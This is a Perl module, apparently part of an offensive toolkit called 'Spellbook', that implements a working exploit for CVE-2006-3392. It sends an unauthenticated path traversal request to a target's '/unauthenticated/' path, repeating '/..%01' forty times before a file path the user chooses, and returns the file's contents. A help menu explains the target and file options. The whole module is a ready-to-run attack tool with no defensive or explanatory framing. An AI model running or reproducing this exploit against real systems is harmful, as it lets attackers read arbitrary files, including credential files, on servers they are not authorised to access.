package Spellbook::Advisory::CVE_2006_3392 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target,
            'f|file=s'   => \$file
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) { 
                $target = "https://$target";
            }
            
            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $temp      = '/..%01' x 40;
            my $request   = $userAgent -> get($target . '/unauthenticated/' . $temp . $file);
            
            return $request -> content(); 
        } 

        if ($help) {
            return "
                \rExploit::CVE_2006_3392
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target
                \r-f, --file     Define a file to read\n\n";
        }

        return 0;
    }
}

1;